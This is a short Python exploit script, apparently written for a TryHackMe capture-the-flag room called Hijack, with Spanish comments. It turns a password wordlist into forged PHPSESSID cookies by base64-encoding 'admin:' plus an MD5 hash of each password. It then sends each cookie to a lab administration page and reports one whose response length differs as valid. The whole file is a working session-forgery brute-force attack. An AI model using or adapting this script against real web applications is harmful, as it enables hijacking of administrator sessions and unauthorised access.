import os
import base64
import hashlib
import requests

#cambiar la ruta de la lista de palabras
#cambiar la ip de la maquina
pass_file = '/tryhackme/ctf/hijack/content/pass.txt'
main_url = 'http://10.10.16.157/administration.php'


def md5_hash(text):
    return hashlib.md5(text.encode()).hexdigest()

def exploit():
    with open('cookies.txt', 'a') as file:
        with open(pass_file, 'r') as r:
            for passw in r:
                passw = passw.strip()  
                hashed_pass = md5_hash(passw)
                user_pass = f"admin:{hashed_pass}"
                encoded_user_pass = base64.b64encode(user_pass.encode()).decode()
                file.write(encoded_user_pass + '\n')
                
def payload():
    valid_cookie = ''
    with open('cookies.txt','r') as file:
        for key in file:
            headers = {
                'Cookie':'PHPSESSID={0}'.format(key.strip())
            }
            solicitud = requests.get(main_url,headers=headers)
            leng = len(solicitud.content)
            if leng != 51:
                valid_cookie = key.strip()
                print(f"[+] Cookie Valida!: {valid_cookie}")
                break            
            
if __name__ == '__main__':
    exploit()
    payload()